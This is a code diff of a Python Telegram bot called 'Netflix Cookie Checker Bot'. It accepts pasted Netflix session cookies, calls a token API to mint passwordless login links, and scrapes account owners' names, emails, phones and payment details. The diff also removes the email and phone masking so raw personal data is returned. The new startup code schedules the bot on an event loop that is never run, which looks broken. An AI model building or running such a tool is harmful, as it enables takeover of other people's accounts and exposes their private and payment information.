@@ -3,9 +3,13 @@ import asyncio
 import logging
 import re
 from typing import Dict, Optional, Tuple
+import time
+import signal
+import sys
 
 import requests
 import html
+from flask import Flask
 from telegram import Update
 from telegram.ext import (
     ApplicationBuilder,
@@ -16,8 +20,7 @@ from telegram.ext import (
 )
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-PORT = int(os.environ.get("PORT", 8000))
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL")  # e.g., https://your-app.onrender.com
+PORT = int(os.environ.get("PORT", 10000))
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
@@ -25,6 +28,9 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+app_flask = Flask(__name__)
+application = None
+bot_task = None
 
 START_TEXT = (
     "👋 Netflix Cookie Checker Bot\n\n"
@@ -42,7 +48,6 @@ HELP_TEXT = (
     "• If valid, bot converts it into a session login link ( phone | pc | tv )"
 )
 
-
 COOKIE_NAME_RE = re.compile(r"(?i)\b(netflixid|securenetflixid|netflixcookies|__secure-netflixcookies)\b")
 COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)
 
@@ -53,15 +58,7 @@ def _looks_like_cookie_header(text: str) -> bool:
 
 
 def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
-    """
-    Accept either:
-      - full Cookie: a=b; c=d
-      - values-only lines like NetflixId=...; SecureNetflixId=...
-    """
-    # Remove leading "Cookie:" if present
     cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", text).strip()
-
-    # Split by ';' first (Cookie header style)
     parts = [p.strip() for p in cleaned.split(";") if p.strip()]
     if len(parts) == 1 and "\n" in cleaned:
         parts = [p.strip() for p in cleaned.splitlines() if p.strip()]
@@ -73,31 +70,24 @@ def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
             k = m.group(1).strip()
             v = m.group(2).strip()
             kv[k] = v
-            continue
 
-        # If part doesn't match key=value, ignore it.
     return kv
 
 
 def _build_cookie_header(cookie_input: str) -> Optional[str]:
-    # If user pasted full Cookie: header line, keep it (after stripping "Cookie:")
     if _looks_like_cookie_header(cookie_input):
         cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
-        # Basic sanity: require at least one '='
         if "=" not in cleaned:
             return None
         return cleaned
 
-    # Otherwise treat as values-only: attempt parse key=value pairs
     kv = _extract_cookie_kv_pairs(cookie_input)
     if not kv:
         return None
-    # Rebuild into Cookie header format
     return "; ".join([f"{k}={v}" for k, v in kv.items()])
 
 
 def _safe_preview_cookie_keys(cookie_header: str) -> str:
-    # Never log values; only list cookie names.
     names = []
     for token in cookie_header.split(";"):
         token = token.strip()
@@ -172,10 +162,6 @@ def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
 
 
 def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, str, Optional[str]]:
-    """
-    Mirrors NetflixBot.py: call FTL token API using NetflixId cookie.
-    Returns: (ok, detail, nftoken)
-    """
     netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
     if not netflix_id:
         return False, "Invalid or expired cookie.", None
@@ -194,7 +180,6 @@ def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, st
         r.raise_for_status()
         data = r.json()
 
-        # Mirror NetflixBot.py extraction exactly
         td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
         nftoken = td.get("token")
 
@@ -202,38 +187,18 @@ def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, st
             return False, "Invalid or expired cookie.", None
 
         return True, "Token API returned a valid nftoken.", nftoken
-    except Exception:
+    except Exception as e:
+        logger.error(f"Error generating nftoken: {e}")
         return False, "Invalid or expired cookie.", None
 
 
-EMAIL_RE = re.compile(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})')
-PHONE_RE = re.compile(r'(\+?\d{2})\d{2,}(\d{2})')
-
-
-def _scrub_email(m: re.Match) -> str:
-    # keep first 2 chars + domain tail, remove middle
-    g1 = m.group(1)
-    g2 = m.group(2)
-    return f"{g1}***{g2}"
-
-
-def _scrub_phone(m: re.Match) -> str:
-    return f"{m.group(1)}******{m.group(2)}"
-
-
 def _scrub_text(text: str) -> str:
-    # No masking: return raw values.
     if not text:
         return "Unknown"
     return str(text)
 
 
 def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, str]:
-    """
-    Best-effort account info extraction copied/adapted from NetflixBot.py check_netflix_cookie.
-    Returns dict with keys (ok/premium/name/country/plan/email/member_since/plan_price/...).
-    """
-    # Turn Cookie header into a dict for Session.cookies.update()
     cookie_dict: Dict[str, str] = {}
     for token in cookie_header.split(";"):
         token = token.strip()
@@ -340,11 +305,11 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, 
         ms = status_match.group(1) if status_match else None
 
         is_prem = ms == "CURRENT_MEMBER" if ms else bool(plan and "free" not in str(plan).lower())
-        has_account = ("Account" in txt)  # sanity
-        if not (has_account):
+        has_account = ("Account" in txt)
+        if not has_account:
             return {"ok": False, "reason": "No account data found"}
 
-        profiles: list[str] = []
+        profiles: list = []
         try:
             rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15, verify=False)
             if rp.status_code == 200:
@@ -382,245 +347,217 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, 
             "membership_status": ms or "Unknown",
         }
     except Exception as e:
+        logger.error(f"Error checking netflix cookie: {e}")
         return {"ok": False, "reason": str(e)}
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(START_TEXT, parse_mode="Markdown")
+    try:
+        logger.info(f"📱 /start from {update.effective_user.id}")
+        await update.message.reply_text(START_TEXT, parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"Error in start: {e}")
 
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(HELP_TEXT)
+    try:
+        logger.info(f"❓ /help from {update.effective_user.id}")
+        await update.message.reply_text(HELP_TEXT)
+    except Exception as e:
+        logger.error(f"Error in help: {e}")
 
 
 async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.message:
-        return
+    try:
+        if not update.message:
+            return
 
-    cookie_input = (update.message.text or "").strip()
-    if not cookie_input:
-        await update.message.reply_text("Please paste your cookies.")
-        return
+        user_id = update.effective_user.id
+        cookie_input = (update.message.text or "").strip()
+        logger.info(f"📨 Message from {user_id}: {len(cookie_input)} chars")
+        
+        if not cookie_input:
+            await update.message.reply_text("Please paste your cookies.")
+            return
 
-    cookie_header = _build_cookie_header(cookie_input)
-    if not cookie_header:
-        await update.message.reply_text(
-            "❌ Could not parse cookies.\n\n"
-            "Paste either:\n"
-            "• Full `Cookie:` header line, or\n"
-            "• Key=Value pairs (NetflixId=..., SecureNetflixId=..., ...)"
-            "\n\nThen send again."
-        )
-        return
-
-    # Show progress
-    preview = _safe_preview_cookie_keys(cookie_header)
-    msg = await update.message.reply_text(
-        f"🔎 Checking Netflix cookies...\n"
-        f"(Detected cookie names: {preview})"
-    )
-
-    # Run blocking HTTP in a thread
-    loop = asyncio.get_running_loop()
-    ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
-
-    if ok and nftoken:
-        # also fetch account details using technique from NetflixBot.py
-        acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
-
-        # Exact URLs that work in NetflixBot.py
-        phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
-        desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
-        tv_link = f"https://www.netflix.com/tv8?nftoken={nftoken}"
-
-        phone_html = f'<a href="{phone_link}">Open link</a>'
-        desktop_html = f'<a href="{desktop_link}">Open link</a>'
-        tv_html = f'<a href="{tv_link}">Open link</a>'
-
-        # If parsing fails, still show links
-        acct_ok = bool(acct and acct.get("ok") is True)
-        status_line = f"Verification: {detail}\n"
-
-        acct_text = ""
-        if acct_ok:
-            acct_text = (
-                "\n\nAccount details:\n"
-                f"• Name: {acct.get('name','Unknown')}\n"
-                f"• Plan: {acct.get('plan','Unknown')} ({acct.get('plan_price','Unknown')})\n"
-                f"• profiles: {acct.get('profiles','Unknown')}\n"
-                f"• Country: {acct.get('country','Unknown')}\n"
-                f"• Email: {acct.get('email','Unknown')}\n"
-                f"• Member since: {acct.get('member_since','Unknown')}\n"
-                f"• Next billing: {acct.get('next_billing','Unknown')}\n"
-                f"• On payment hold: {acct.get('on_payment_hold','Unknown')}\n"
-                f"• Payment: {acct.get('payment_method','Unknown')} / {acct.get('masked_card','Unknown')}\n"
-                f"• max streams: {acct.get('max_streams','Unknown')}\n"
-                f"• phone: {acct.get('phone','Unknown')} (verified: {acct.get('phone_verified','Unknown')})\n"
-                f"• plan quality: {acct.get('video_quality','Unknown')}\n"
+        cookie_header = _build_cookie_header(cookie_input)
+        if not cookie_header:
+            await update.message.reply_text(
+                "❌ Could not parse cookies.\n\n"
+                "Paste either:\n"
+                "• Full `Cookie:` header line, or\n"
+                "• Key=Value pairs (NetflixId=..., SecureNetflixId=..., ...)"
+                "\n\nThen send again."
             )
+            return
 
-        detail_html = html.escape(str(detail))
-        status_html = html.escape(status_line)
-
-        acct_html = ""
-        if acct_ok:
-            acct_html = (
-                "<b>Account details</b>:\n"
-                f"• Name: {html.escape(str(acct.get('name','Unknown')))}\n"
-                f"• Plan: {html.escape(str(acct.get('plan','Unknown')))} ({html.escape(str(acct.get('plan_price','Unknown')))})\n"
-                f"• profiles: {html.escape(str(acct.get('profiles','Unknown')))}\n"
-                f"• Country: {html.escape(str(acct.get('country','Unknown')))}\n"
-                f"• Email: {html.escape(str(acct.get('email','Unknown')))}\n"
-                f"• Member since: {html.escape(str(acct.get('member_since','Unknown')))}\n"
-                f"• Next billing: {html.escape(str(acct.get('next_billing','Unknown')))}\n"
-                f"• On payment hold: {html.escape(str(acct.get('on_payment_hold','Unknown')))}\n"
-                f"• Payment: {html.escape(str(acct.get('payment_method','Unknown')))} / {html.escape(str(acct.get('masked_card','Unknown')))}\n"
-                f"• max streams: {html.escape(str(acct.get('max_streams','Unknown')))}\n"
-                f"• phone: {html.escape(str(acct.get('phone','Unknown')))} (verified: {html.escape(str(acct.get('phone_verified','Unknown')))})\n"
-                f"• plan quality: {html.escape(str(acct.get('video_quality','Unknown')))}\n"
-            )
-
-        await msg.edit_text(
-            "✅ Valid cookie detected.\n\n"
-            "Session login links:\n"
-            f"📱 Phone: {phone_html}\n"
-            f"🖥️ Desktop: {desktop_html}\n"
-            f"📺 TV: {tv_html}\n"
-            f"\n{status_html}"
-            f"{acct_html}",
-            parse_mode="HTML",
-            disable_web_page_preview=True,
+        preview = _safe_preview_cookie_keys(cookie_header)
+        msg = await update.message.reply_text(
+            f"🔎 Checking Netflix cookies...\n"
+            f"(Detected cookie names: {preview})"
         )
-    else:
-        await msg.edit_text("❌ Invalid or expired cookie.")
 
+        loop = asyncio.get_running_loop()
+        ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
 
-async def main():
-    """Start the bot with webhook support for Render."""
-    if not BOT_TOKEN:
-        logger.error("❌ BOT_TOKEN not set!")
-        return
+        if ok and nftoken:
+            acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
 
-    if not WEBHOOK_URL:
-        logger.error("❌ WEBHOOK_URL not set!")
-        return
+            phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
+            desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
+            tv_link = f"https://www.netflix.com/tv8?nftoken={nftoken}"
 
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+            phone_html = f'<a href="{phone_link}">Open link</a>'
+            desktop_html = f'<a href="{desktop_link}">Open link</a>'
+            tv_html = f'<a href="{tv_link}">Open link</a>'
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
+            acct_ok = bool(acct and acct.get("ok") is True)
+            status_line = f"Verification: {detail}\n"
 
-    logger.info("🤖 Netflix Cookie Checker Bot is starting (webhook mode)...")
+            acct_html = ""
+            if acct_ok:
+                acct_html = (
+                    "<b>Account details</b>:\n"
+                    f"• Name: {html.escape(str(acct.get('name','Unknown')))}\n"
+                    f"• Plan: {html.escape(str(acct.get('plan','Unknown')))} ({html.escape(str(acct.get('plan_price','Unknown')))})\n"
+                    f"• Profiles: {html.escape(str(acct.get('profiles','Unknown')))}\n"
+                    f"• Country: {html.escape(str(acct.get('country','Unknown')))}\n"
+                    f"• Email: {html.escape(str(acct.get('email','Unknown')))}\n"
+                    f"• Member since: {html.escape(str(acct.get('member_since','Unknown')))}\n"
+                    f"• Next billing: {html.escape(str(acct.get('next_billing','Unknown')))}\n"
+                    f"• On payment hold: {html.escape(str(acct.get('on_payment_hold','Unknown')))}\n"
+                    f"• Payment: {html.escape(str(acct.get('payment_method','Unknown')))} / {html.escape(str(acct.get('masked_card','Unknown')))}\n"
+                    f"• Max streams: {html.escape(str(acct.get('max_streams','Unknown')))}\n"
+                    f"• Phone: {html.escape(str(acct.get('phone','Unknown')))} (verified: {html.escape(str(acct.get('phone_verified','Unknown')))})\n"
+                    f"• Plan quality: {html.escape(str(acct.get('video_quality','Unknown')))}\n"
+                )
 
-    # Use webhook instead of polling
-    await app.bot.set_webhook(url=WEBHOOK_URL, drop_pending_updates=True)
+            status_html = html.escape(status_line)
 
-    async with app:
-        await app.start()
-        logger.info(f"✅ Bot started with webhook: {WEBHOOK_URL}")
-
+            await msg.edit_text(
+                "✅ Valid cookie detected.\n\n"
+                "Session login links:\n"
+                f"📱 Phone: {phone_html}\n"
+                f"🖥️ Desktop: {desktop_html}\n"
+                f"📺 TV: {tv_html}\n"
+                f"\n{status_html}"
+                f"{acct_html}",
+                parse_mode="HTML",
+                disable_web_page_preview=True,
+            )
+            logger.info(f"✅ Cookie validation successful for {user_id}")
+        else:
+            await msg.edit_text("❌ Invalid or expired cookie.")
+            logger.warning(f"❌ Cookie validation failed for {user_id}: {detail}")
+    except Exception as e:
+        logger.error(f"Error in handle_cookie_text: {e}", exc_info=True)
         try:
-            # Keep the app running
-            await asyncio.Event().wait()
-        except KeyboardInterrupt:
-            logger.info("🛑 Shutting down...")
-        finally:
-            await app.stop()
+            await update.message.reply_text(f"❌ Error processing request")
+        except:
+            pass
 
 
-def run_flask_app():
-    """Flask app to receive webhook updates."""
-    from flask import Flask, request
-    from telegram import Update
-
-    flask_app = Flask(__name__)
-
-    @flask_app.route("/", methods=["GET"])
-    def index():
-        return "✅ Netflix Cookie Checker Bot is running!", 200
-
-    @flask_app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
-    async def webhook(request_data):
-        try:
-            update = Update.de_json(request_data.get_json(force=True), application.bot)
-            await application.process_update(update)
-        except Exception as e:
-            logger.error(f"Error processing update: {e}")
-        return "ok", 200
-
-    return flask_app
-
-
-# Global app instance for Flask webhook handler
-application = None
-
-
-async def setup_and_run():
-    """Initialize the bot application and run Flask server."""
+async def run_bot():
+    """Run bot polling"""
     global application
-
+    
+    logger.info("=" * 60)
+    logger.info("🤖 NETFLIX COOKIE CHECKER BOT")
+    logger.info("=" * 60)
+    
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!")
         return
+    
+    try:
+        application = ApplicationBuilder().token(BOT_TOKEN).build()
+        
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("help", help_command))
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
+        
+        logger.info("✅ Handlers registered")
+        logger.info("🚀 Starting polling...\n")
+        
+        await application.run_polling(allowed_updates=Update.ALL_TYPES)
+        
+    except Exception as e:
+        logger.error(f"❌ Bot error: {e}", exc_info=True)
+    finally:
+        logger.info("🛑 Bot stopped")
 
-    if not WEBHOOK_URL:
-        logger.error("❌ WEBHOOK_URL not set!")
-        return
 
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
+# Flask Routes
+@app_flask.route("/", methods=["GET"])
+def index():
+    bot_status = "🟢 Running" if application else "🔴 Stopped"
+    return f"""
+    <html>
+        <head>
+            <title>Netflix Cookie Checker Bot</title>
+            <style>
+                body {{ font-family: Arial; margin: 40px; }}
+                .status {{ padding: 20px; border-radius: 5px; }}
+                .running {{ background-color: #d4edda; }}
+                .stopped {{ background-color: #f8d7da; }}
+            </style>
+        </head>
+        <body>
+            <h1>✅ Netflix Cookie Checker Bot</h1>
+            <div class="status {'running' if application else 'stopped'}">
+                <p><b>Bot Status:</b> {bot_status}</p>
+                <p><b>BOT_TOKEN:</b> {'✅ Set' if BOT_TOKEN else '❌ Not Set'}</p>
+                <p><b>Port:</b> {PORT}</p>
+            </div>
+            <hr>
+            <a href="/health">Health Check</a>
+        </body>
+    </html>
+    """, 200
 
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
 
-    async with application:
-        await application.start()
-        logger.info(f"✅ Bot initialized with webhook: {WEBHOOK_URL}")
-        await application.bot.set_webhook(url=WEBHOOK_URL, drop_pending_updates=True)
+@app_flask.route("/health", methods=["GET"])
+def health():
+    status = "healthy" if application else "unhealthy"
+    return {
+        "status": status,
+        "bot_token_set": bool(BOT_TOKEN),
+        "timestamp": time.time()
+    }, 200 if application else 503
 
 
 if __name__ == "__main__":
-    import sys
-
-    # Check if we should use Flask webhook mode
-    use_webhook = WEBHOOK_URL is not None
-
-    if use_webhook:
-        # Flask + async setup
-        from flask import Flask, request
-        import threading
-
-        flask_app = Flask(__name__)
-
-        @flask_app.route("/", methods=["GET"])
-        def index():
-            return "✅ Netflix Cookie Checker Bot is running!", 200
-
-        @flask_app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
-        def webhook():
-            try:
-                update_data = request.get_json(force=True)
-                update = Update.de_json(update_data, application.bot)
-                # Schedule the coroutine in the event loop
-                asyncio.create_task(application.process_update(update))
-            except Exception as e:
-                logger.error(f"Error processing update: {e}")
-            return "ok", 200
-
-        # Initialize bot in a separate thread
-        def init_bot():
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(setup_and_run())
-
-        init_thread = threading.Thread(target=init_bot, daemon=True)
-        init_thread.start()
-
-        # Run Flask server
-        logger.info(f"🚀 Starting Flask server on port {PORT}")
-        flask_app.run(host="0.0.0.0", port=PORT, debug=False)
-    else:
-        # Polling mode (for local development)
-        logger.info("🔄 Starting bot in polling mode...")
-        asyncio.run(main())
+    logger.info(f"\n📌 PORT: {PORT}")
+    logger.info(f"📌 BOT_TOKEN: {'✅ SET' if BOT_TOKEN else '❌ NOT SET'}\n")
+    
+    if not BOT_TOKEN:
+        logger.error("❌ BOT_TOKEN environment variable is not set!")
+        sys.exit(1)
+    
+    # Create event loop
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    # Schedule bot to run
+    bot_task = loop.create_task(run_bot())
+    
+    def signal_handler(sig, frame):
+        logger.info("\n🛑 Shutting down...")
+        bot_task.cancel()
+        sys.exit(0)
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    
+    # Run Flask with asyncio
+    logger.info(f"🚀 Starting Flask + Bot on port {PORT}\n")
+    
+    try:
+        # Run Flask in a way that allows asyncio to run alongside
+        app_flask.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False, threaded=True)
+    except KeyboardInterrupt:
+        logger.info("🛑 Keyboard interrupt")
+    finally:
+        if bot_task and not bot_task.done():
+            bot_task.cancel()
+        loop.close()
